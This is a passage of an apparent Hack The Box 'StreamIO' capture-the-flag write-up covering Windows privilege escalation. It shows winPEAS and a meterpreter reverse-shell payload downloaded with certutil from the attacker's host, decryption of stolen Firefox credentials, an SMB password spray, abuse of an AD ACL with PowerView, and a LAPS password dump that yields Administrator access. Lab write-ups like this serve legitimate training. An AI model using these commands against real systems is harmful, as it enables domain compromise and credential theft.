--2022-06-29 00:37:53--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/90e2cea0-071d-4cdd-83ae-0a85bec3871c?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220628%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220628T203526Z&X-Amz-Expires=300&X-Amz-Signature=643f89c5a4eded8c01aff882726f22b5ee10ad27313b6963f386e3acf5f51282&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3DwinPEASx64.exe&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1936384 (1.8M) [application/octet-stream]
Saving to: ‘winPEASx64.exe’

winPEASx64.exe                         100%[============================================================================>]   1.85M  9.86MB/s    in 0.2s    

2022-06-29 00:37:54 (9.86 MB/s) - ‘winPEASx64.exe’ saved [1936384/1936384]

                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/streamio/serve]
└─$ mv winPEASx64.exe peas.exe                                                            
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/streamio/serve]
└─$ python3 -m updog -p 80                                                                
[+] Serving /home/kali/htb/streamio/serve...
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://192.168.178.89:80/ (Press CTRL+C to quit)
10.10.11.158 - - [29/Jun/2022 00:38:21] "GET /peas.exe HTTP/1.1" 200 -
10.10.11.158 - - [29/Jun/2022 00:38:22] "GET /peas.exe HTTP/1.1" 200 -
```

Recieve Winpeas:
```
*Evil-WinRM* PS C:\Users\nikk37\Desktop> certutil.exe -urlcache -split -f http://10.10.14.8/peas.exe peas.exe
****  Online  ****
  000000  ...
  1d8c00
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\nikk37\Desktop> 

```

Takeaways:

```LAPS``` is enabled:
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
È If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: 1
    LAPS Admin Account Name: 
    LAPS Password Complexity: 4
    LAPS Password Length: 14
    LAPS Expiration Protection Enabled: 1
```

We are in the ```Domain Users``` group, a Domain might be in use:
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
È Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups
  [X] Exception: Object reference not set to an instance of an object.
  Current user: nikk37
  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Builtin\Pre-Windows 2000 Compatible Access, Network, Authenticated Users, This Organization, NTLM Authentication
```
Uh -  and a Firefox DB is present!
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release
```
Okay, we got an potencial attack path setup. Lets switch to a ```meterpreter``` shell to make file transfers a bit easier.

Generate shell:
```
┌──(kali㉿kali)-[~/htb/streamio/serve]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=9003 -f exe -o peter.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: peter.exe
```
Setup handler:
```
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.8
LHOST => 10.10.14.8
msf6 exploit(multi/handler) > set LPORT 9003
LPORT => 9003
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.8:9003 
```

Upload and execute shell:
```
*Evil-WinRM* PS C:\tmp> certutil.exe -urlcache -split -f http://10.10.14.8/peter.exe peter.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\tmp> dir


    Directory: C:\tmp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/28/2022   9:12 PM           7168 peter.exe


*Evil-WinRM* PS C:\tmp> .\peter.exe
```
Download ```Firefox``` profiles:
```
meterpreter > download *
[*] mirroring  : .\5rwivk2l.default -> /home/kali/htb/streamio/serve/5rwivk2l.default
[*] downloading: .\5rwivk2l.default\times.json -> /home/kali/htb/streamio/serve/5rwivk2l.default/times.json
[*] download   : .\5rwivk2l.default\times.json -> /home/kali/htb/streamio/serve/5rwivk2l.default/times.json
[*] mirrored   : .\5rwivk2l.default -> /home/kali/htb/streamio/serve/5rwivk2l.default
[*] mirroring  : .\br53rxeg.default-release -> /home/kali/htb/streamio/serve/br53rxeg.default-release

```

Using ```firepwd```, we can crack that datatabase open:
https://github.com/lclevy/firepwd

```
┌──(kali㉿kali)-[~/htb/streamio/firepwd]
└─$ python firepwd.py  -d ../serve/br53rxeg.default-release/       
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

| Username  | Password |
|---|---|
|  admin | JDg0dd1s@d0p3cr3@t0r  |
|  nikk37 | n1kk1sd0p3t00:)  |
| yoshihide  | paddpadd@12  |
| JDgodd  |  password@12 |

I've added ```slack.streamio.htb``` to my ```/etc/hosts``` but was unable to open a Website.
So I assume it was just used to provide the credentials.

### Bloodhound

Lets enumerate the AD, I've used the following repo to generate the files for a```Bloodhound``` audit:
https://github.com/fox-it/BloodHound.py

```
┌──(kali㉿kali)-[~/htb/streamio/BloodHound.py]
└─$ python bloodhound.py -u nikk37 -p 'get_dem_girls2@yahoo.com' -dc streamio.htb -d streamio.htb -ns 10.10.11.158                                      1 ⨯
INFO: Found AD domain: streamio.htb
INFO: Connecting to LDAP server: streamio.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 8 users
INFO: Connecting to GC LDAP server: dc.streamio.htb
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.streamIO.htb
INFO: Done in 00M 03S
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/streamio/BloodHound.py]
└─$ ll
total 56
-rw-r--r-- 1 kali kali  1510 Jun 29 01:37 20220629013701_computers.json
-rw-r--r-- 1 kali kali   577 Jun 29 01:37 20220629013701_domains.json
-rw-r--r-- 1 kali kali 19849 Jun 29 01:37 20220629013701_groups.json
-rw-r--r-- 1 kali kali  4003 Jun 29 01:37 20220629013701_users.json
```
Lets manually investigate first:

```
┌──(kali㉿kali)-[~/htb/streamio/BloodHound.py]
└─$ cat 20220629013701_users.json | jq | grep \"name\"
        "name": "YOSHIHIDE@STREAMIO.HTB",
        "name": "NIKK37@STREAMIO.HTB",
        "name": "MARTIN@STREAMIO.HTB",
        "name": "JDGODD@STREAMIO.HTB",
        "name": "KRBTGT@STREAMIO.HTB",
        "name": "GUEST@STREAMIO.HTB",
        "name": "ADMINISTRATOR@STREAMIO.HTB",
        "name": "NT AUTHORITY@STREAMIO.HTB"
                                             
```

Okay, so we got domain users and we already got some passwords - let's start a password spray, to check for any valid combination and ```password reuse```.

```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ cat users.txt  
admin
nikk37
yoshihide
JDgodd
Martin
db_admin
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/streamio]
└─$ cat passwd.txt 
JDg0dd1s@d0p3cr3@t0r
n1kk1sd0p3t00:)
paddpadd@12
password@12
get_dem_girls2@yahoo.com
B1@hx31234567890
66boysandgirls..
```
Since I've already got shell I used ```metasploit``` again.
```
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.11.158
RHOSTS => 10.10.11.158
msf6 auxiliary(scanner/smb/smb_login) > set USER_FiLE ../users.txt
USER_FiLE => ../users.txt
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE ../passwd.txt
PASS_FILE => ../passwd.txt
msf6 auxiliary(scanner/smb/smb_login) > run

[*] 10.10.11.158:445      - 10.10.11.158:445 - Starting SMB login bruteforce
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\admin:JDg0dd1s@d0p3cr3@t0r',
[!] 10.10.11.158:445      - No active DB -- Credential data will not be saved!
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\admin:n1kk1sd0p3t00:)',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\admin:paddpadd@12',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\admin:password@12',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\admin:get_dem_girls2@yahoo.com',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\admin:B1@hx31234567890',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\admin:66boysandgirls..',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\nikk37:JDg0dd1s@d0p3cr3@t0r',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\nikk37:n1kk1sd0p3t00:)',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\nikk37:paddpadd@12',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\nikk37:password@12',
[+] 10.10.11.158:445      - 10.10.11.158:445 - Success: '.\nikk37:get_dem_girls2@yahoo.com'
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\yoshihide:JDg0dd1s@d0p3cr3@t0r',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\yoshihide:n1kk1sd0p3t00:)',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\yoshihide:paddpadd@12',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\yoshihide:password@12',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\yoshihide:get_dem_girls2@yahoo.com',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\yoshihide:B1@hx31234567890',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\yoshihide:66boysandgirls..',
[+] 10.10.11.158:445      - 10.10.11.158:445 - Success: '.\JDgodd:JDg0dd1s@d0p3cr3@t0r'
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\Martin:JDg0dd1s@d0p3cr3@t0r',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\Martin:n1kk1sd0p3t00:)',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\Martin:paddpadd@12',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\Martin:password@12',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\Martin:get_dem_girls2@yahoo.com',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\Martin:B1@hx31234567890',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\Martin:66boysandgirls..',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\db_admin:JDg0dd1s@d0p3cr3@t0r',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\db_admin:n1kk1sd0p3t00:)',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\db_admin:paddpadd@12',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\db_admin:password@12',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\db_admin:get_dem_girls2@yahoo.com',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\db_admin:B1@hx31234567890',
[-] 10.10.11.158:445      - 10.10.11.158:445 - Failed: '.\db_admin:66boysandgirls..',
[*] 10.10.11.158:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We got credentials!

| Username  | Password |
|---|---|
| nikk37  | get_dem_girls2@yahoo.com'  |
| JDgodd  | JDg0dd1s@d0p3cr3@t0r  |


Unfortunately the user ```JDgodd``` has no permission to use winrm.

```
┌──(kali㉿kali)-[~/htb/streamio/serve]
└─$ evil-winrm -i 10.10.11.158 -u JDgodd  -p 'JDg0dd1s@d0p3cr3@t0r'   

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

After checking for techniques i've found a entry on ```Hacktricks``` that allows us to use anothers users credentials with ```Powerview```
https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview

```
# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\jdgodd', $SecPassword)
Get-DomainUser -Credential $Cred
```

```
*Evil-WinRM* PS C:\tmp> upload htb/streamio/PowerView.ps1
Info: Uploading htb/streamio/PowerView.ps1 to C:\tmp\PowerView.ps1

                                                             
Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\tmp> 
```

Maybe we can use that later, first enumerate the AD further.

The bloodhound ```.json``` files that were generated by ```BloodHound.py``` were either not complete or corrupted, Bloodhound was not loading them correctly. 
So i've uploaded SharpHound.exe and generated a new report.

I've downloaded the zip with ```meterpreter``` because ```Evil-WinRM``` apparently downloaded the file but I was not able to find it on my system.

```
meterpreter > download 20220629094741_BloodHound.zip
[*] Downloading: 20220629094741_BloodHound.zip -> /home/kali/htb/streamio/serve/20220629094741_BloodHound.zip
[*] Downloaded 10.95 KiB of 10.95 KiB (100.0%): 20220629094741_BloodHound.zip -> /home/kali/htb/streamio/serve/20220629094741_BloodHound.zip
[*] download   : 20220629094741_BloodHound.zip -> /home/kali/htb/streamio/serve/20220629094741_BloodHound.zip
```

### Final Attack Path
Okay so the Bloodhound graph makes the attack path clear:

> The user JDGODD@STREAMIO.HTB has the ability to modify the owner of the group CORE STAFF@STREAMIO.HTB.

> Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.

> The members of the group CORE STAFF@STREAMIO.HTB have the ability to read the password set by Local Administrator Password Solution (LAPS) on the computer DC.STREAMIO.HTB.

> The local administrator password for a computer managed by LAPS is stored in the confidential LDAP attribute, "ms-mcs-AdmPwd".


First use the technique from ```PowerView``` to execute commands as ```JDgodd```

```
*Evil-WinRM* PS C:\tmp> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\tmp> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\tmp> $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\jdgodd', $SecPassword)
```

Next manipulate the ACL
https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/

```
*Evil-WinRM* PS C:\tmp> Add-DomainObjectACL -Credential $Cred -TargetIdentity "Core Staff" -principalidentity "streamio\JDgodd"
```

Finally add ```jdgodd``` to the LAPS reader group.
https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/

```
*Evil-WinRM* PS C:\tmp> Add-DomainGroupMember -Identity "Core Staff"  -Members "streamio\JDGODD" -Credential $Cred
*Evil-WinRM* PS C:\tmp> Get-ADGroupMember -Identity "Core Staff"


distinguishedName : CN=JDgodd,CN=Users,DC=streamIO,DC=htb
name              : JDgodd
objectClass       : user
objectGUID        : 65c471ea-fff5-4cc7-9aa0-0f5b819fac9d
SamAccountName    : JDgodd
SID               : S-1-5-21-1470860369-1569627196-4264678630-1104



*Evil-WinRM* PS C:\tmp> 
```

### Dump LAPS via LDAP
https://github.com/n00py/LAPSDumper


```
┌──(kali㉿kali)-[~/htb/streamio/LAPSDumper]
└─$ python laps.py -u JDgodd -p JDg0dd1s@d0p3cr3@t0r -d streamio.htb                                                                                    2 ⨯
LAPS Dumper - Running at 06-29-2022 15:47:20
DC ,+[9!QPc6H$&+.

```
```
┌──(kali㉿kali)-[~/htb/streamio/LAPSDumper]
└─$ evil-winrm -i 10.10.11.158 -u Administrator  -p ',+[9!QPc6H$&+.'                                                                                    1 ⨯

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
```

```
*Evil-WinRM* PS C:\Users\Martin\Desktop> type root.txt
ee67d4d4b22f656ba328e0cf85bcc3e2
```